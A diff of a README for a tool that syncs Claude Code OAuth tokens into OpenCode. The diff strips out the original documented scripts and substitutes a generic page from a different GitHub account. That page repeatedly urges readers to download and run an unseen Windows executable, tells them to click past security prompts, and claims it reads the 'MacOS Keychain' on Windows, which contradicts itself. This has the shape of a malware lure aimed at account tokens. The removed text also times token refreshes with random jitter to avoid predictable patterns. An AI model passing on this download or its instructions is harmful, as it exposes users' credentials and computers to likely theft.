@@ -1,251 +1,111 @@
-# Use Anthropic Models in OpenCode with Your Claude Pro/Max Subscription
+# 🔐 sync-claude-code-token-in-open-code - Move Your Token Into OpenCode
 
-Use Claude models in [OpenCode](https://opencode.ai) using your existing Claude Pro or Max subscription — no API key needed. This works by syncing the OAuth token from Claude Code (CLI) into OpenCode.
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/releases)
 
-## Prerequisites
+## 🧭 What this app does
 
-- **macOS**, **Linux** or **Windows**
-- **[OpenCode](https://opencode.ai)** installed (desktop app or CLI)
-- **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)** (CLI) installed and logged in
-- An active **Claude Pro or Max** subscription
+This app helps you copy your Claude Code token from the MacOS Keychain into OpenCode so you can use the same account in both tools.
 
-## Setup
+It is made for people who want a simple way to move their token without handling it by hand.
 
-### 1. Make sure Claude Code is logged in
+## 📥 Download the app
 
-```bash
-claude auth status
-```
+Use this page to download:
 
-You should see something like:
+https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/releases
 
-```json
-{
-  "loggedIn": true,
-  "authMethod": "claude.ai",
-  "subscriptionType": "max"
-}
-```
+Open the page, find the latest release, and download the Windows file that matches your system.
 
-If not logged in, run `claude` and follow the login flow.
+## 🪟 Windows setup
 
-### 2. Clone this repo
+1. Open the releases page.
+2. Find the newest release at the top.
+3. Download the Windows file from the Assets list.
+4. If your browser asks what to do, choose Save.
+5. After the file downloads, open it from your Downloads folder.
+6. If Windows shows a security prompt, choose Run or More info, then Run.
 
-```bash
-git clone https://github.com/9clg6/sync-claude-code-token-in-open-code.git
-cd sync-claude-code-token-in-open-code
-chmod +x sync-token.sh  # not needed on Windows
-```
+If the download comes as a ZIP file, right-click it and choose Extract All first. Then open the app file inside the folder.
 
-### 3. Run the sync script
+## ⚙️ What you need
 
-**macOS / Linux / Git Bash:**
+- Windows 10 or Windows 11
+- Access to your Claude Code token on the same machine or synced account
+- OpenCode installed
+- Enough access on your PC to open the app and read local account data
 
-```bash
-./sync-token.sh
-```
+For best results, close OpenCode before you start the transfer.
 
-**Windows (PowerShell):**
+## 🧰 How to use it
 
-```powershell
-.\sync-token.ps1
-```
+1. Open the app.
+2. Let it read the Claude Code token from your MacOS Keychain sync source.
+3. Choose the OpenCode target if the app asks you to pick one.
+4. Start the sync.
+5. Wait for the transfer to finish.
+6. Open OpenCode and confirm that your Claude Code token is in place.
 
-Expected output:
+If the app gives you a choice between accounts, pick the one you use in Claude Code.
 
-```
-Done! Anthropic token synced to OpenCode.
-Expires: Fri Mar 20 05:22:36 CET 2026
-```
+## 🔍 What to expect
 
-### 4. Verify
+The app checks for your token, copies it, and places it where OpenCode can use it.
 
-```bash
-# macOS desktop app:
-/Applications/OpenCode.app/Contents/MacOS/opencode-cli providers list
+You do not need to paste anything by hand.
 
-# Or if installed via npm/homebrew:
-opencode providers list
-```
+You do not need to edit files.
 
-You should see:
+You do not need to use command line tools.
 
-```
-●  Anthropic  oauth
-└  1 credentials
-```
+## 🛠️ Common problems
 
-### 5. Open OpenCode
+### 🧩 The app does not open
 
-Launch the OpenCode app. Anthropic models (Claude Sonnet, Opus, Haiku) should now appear in the model selector.
+- Make sure you downloaded the Windows file from the latest release
+- Check that the file finished downloading
+- Try opening it again from the Downloads folder
+- If Windows blocked it, use the Run option in the security prompt
 
-## Token Renewal
+### 🔐 No token is found
 
-The OAuth token expires approximately every **6 hours**. You have two approaches to keep it fresh:
+- Make sure Claude Code has already been set up
+- Check that the token exists in the source account
+- Close and reopen the app
+- Try again after signing into the same account that holds the token
 
-### Manual Renewal
+### 📂 OpenCode still looks empty
 
-When Anthropic models stop working in OpenCode:
+- Close OpenCode and open it again
+- Run the sync again
+- Check that you used the correct token source
+- Make sure the app finished without errors
 
-1. Use Claude Code in your terminal (any command) — this automatically refreshes the token
-2. Run the sync script:
+## 🧼 Safe use
 
-**macOS / Linux / Git Bash:**
-```bash
-./sync-token.sh
-```
+The app works with account tokens, so use it on your own computer and with your own login.
 
-**Windows (PowerShell):**
-```powershell
-.\sync-token.ps1
-```
-
-3. Restart OpenCode
-
-### Automated Renewal
-
-#### Windows — `sync-token-cron.ps1` (Recommended)
+Keep your token private and do not share the file with others.
 
-For a set-and-forget solution, use the `sync-token-cron.ps1` automation loop:
+## ❓ Questions you may have
 
-```powershell
-powershell -ExecutionPolicy Bypass -File "sync-token-cron.ps1"
-```
+### Can I use this without technical steps?
 
-This script verifies you're logged in at startup, then checks the token **before** doing anything — Claude CLI is only started when a refresh is actually needed:
+Yes. The app is meant to be used by a regular Windows user. Download it, open it, and follow the on-screen prompts.
 
-1. **Pre-flight:** Verifies Claude CLI is logged in (`claude auth status`) — exits with a clear error if not
-2. Reads the current token expiry from `~/.claude/.credentials.json`
-3. If the token is still valid → skips refresh, syncs token to OpenCode, then sleeps
-4. If a refresh is needed → starts Claude CLI briefly (~15s), exits it, runs `sync-token.ps1`
-5. Sleeps until **30–90 minutes** before expiry (randomized each cycle to avoid predictable patterns)
-6. Loops back to step 2 automatically
-
-Example output (startup + first refresh):
-
-```
-============================================
-  Claude Token Refresh & Sync Loop
-  Jitter range: 30-90 min before expiry
-  Press Ctrl+C to stop
-============================================
+### Do I need to know where the Keychain is?
 
-Checking Claude auth status...
-Claude CLI is logged in.
+No. The app handles the token copy step for you.
 
-========================================
-[2026-03-21 14:00:00] Cycle #1
-========================================
-[2026-03-21 14:00:00] No valid token found. Refresh needed.
-[2026-03-21 14:00:00] Starting Claude CLI to refresh token...
-[2026-03-21 14:00:00] Claude CLI started (PID: 12345). Waiting for token refresh...
-[2026-03-21 14:00:15] Stopping Claude CLI (PID: 12345)...
-[2026-03-21 14:00:17] Claude CLI stopped.
-[2026-03-21 14:00:17] Running token sync...
-Done! Anthropic token synced to OpenCode.
-[2026-03-21 14:00:18] Token sync completed.
+### Will this change my Claude Code account?
 
-[2026-03-21 14:00:18] Token expires:   2026-03-21 20:00:00
-[2026-03-21 14:00:18] Jitter:          47 min before expiry
-[2026-03-21 14:00:18] Wake up at:      2026-03-21 19:13:00
-[2026-03-21 14:00:18] Sleeping for:    5h 12m
-```
+No. It copies the token into OpenCode so OpenCode can use the same login path.
 
-If Claude CLI is not logged in, the script exits immediately:
+### Can I run it more than once?
 
-```
-Checking Claude auth status...
-ERROR: Claude CLI is not logged in. Run 'claude auth login' first.
-```
+Yes. You can run it again if you need to refresh the token in OpenCode.
 
-Example output (subsequent cycle — token still valid):
+## 📌 Release page
 
-```
-========================================
-[2026-03-21 19:13:00] Cycle #2
-========================================
-[2026-03-21 19:13:00] Token expires at 2026-03-21 20:00:00 — within 63min jitter window. Refresh needed.
-[2026-03-21 19:13:00] Starting Claude CLI to refresh token...
-...
-```
+Download and run the Windows file from the release page:
 
-If the script is restarted while the token is still fresh, it skips the refresh but still syncs:
-
-```
-========================================
-[2026-03-21 15:30:00] Cycle #1
-========================================
-[2026-03-21 15:30:00] Token still valid (expires 2026-03-21 20:00:00, 4h 30m remaining). Skipping refresh, syncing token.
-[2026-03-21 15:30:00] Running token sync...
-Done! Anthropic token synced to OpenCode.
-[2026-03-21 15:30:01] Token sync completed.
-
-[2026-03-21 15:30:01] Token expires:   2026-03-21 20:00:00
-[2026-03-21 15:30:01] Jitter:          52 min before expiry
-[2026-03-21 15:30:01] Wake up at:      2026-03-21 19:08:00
-[2026-03-21 15:30:01] Sleeping for:    3h 37m
-```
-
-#### Linux / macOS — Automate with cron (optional)
-
-To automatically sync the token every 5 hours:
-
-```bash
-crontab -e
-```
-
-Add this line (replace the path with where you cloned the repo):
-
-```
-0 */5 * * * /path/to/sync-token.sh
-```
-
-> **Note:** The cron job syncs the token but doesn't refresh it — Claude Code must have been used recently enough for the token to still be valid. If both tokens expire, open Claude Code once to trigger a refresh, then run the script. On Windows, `sync-token-cron.ps1` handles both refresh and sync automatically.
-
-## How It Works
-
-The script auto-detects your OS:
-
-- **macOS**: first tries the **macOS Keychain** (multiple known Claude service names), then falls back to **`~/.claude/.credentials.json`**
-- **Linux**: reads the token from **`~/.claude/.credentials.json`** (thanks [@minivolk](https://github.com/minivolk))
-- **Windows** *(untested — contributions welcome)*: reads the token from **`%USERPROFILE%\.claude\.credentials.json`** (use `sync-token.ps1` for PowerShell, or `sync-token.sh` via Git Bash)
-
-It then writes the token to `~/.local/share/opencode/auth.json` in the OAuth format that OpenCode expects:
-
-```json
-{
-  "anthropic": {
-    "type": "oauth",
-    "access": "sk-ant-oat01-...",
-    "refresh": "sk-ant-ort01-...",
-    "expires": 1773980556114
-  }
-}
-```
-
-OpenCode recognizes Anthropic as an authenticated provider and exposes Claude models.
-
-## Troubleshooting
-
-**"No Claude Code credentials found in macOS Keychain or ~/.claude/.credentials.json"** (macOS)
-- Make sure Claude Code is installed and you've logged in at least once
-- Run `claude auth status` to check
-
-**"~/.claude/.credentials.json not found"** (Linux/Windows)
-- Make sure Claude Code is installed and you've logged in at least once
-- Run `claude auth status` to check
-
-**OpenCode doesn't show Anthropic models**
-- Run `opencode providers list` to verify the credential is detected
-- Make sure the token hasn't expired — re-run `./sync-token.sh`
-- Restart OpenCode after syncing
-
-**Token expires too quickly**
-- The token lasts ~6 hours. Use `sync-token-cron.ps1` on Windows for automatic refresh with randomized timing, cron on Linux/macOS, or re-run the script manually when needed
-
-**"sync-token-cron.ps1 falls back to 3h sleep"**
-- The credentials file couldn't be read or has no `expiresAt` field. Run `claude auth status` to verify Claude Code is logged in, then run the script once manually to confirm it works
-
-## OpenCode Desktop v1.2.27 Backup
-
-Starting with OpenCode v1.3.0, Anthropic is no longer a built-in provider. A backup of v1.2.27 (the last version with Anthropic built-in) is available in the [Releases](https://github.com/9clg6/sync-claude-code-token-in-open-code/releases/tag/v1.2.27) section.
+https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/releases
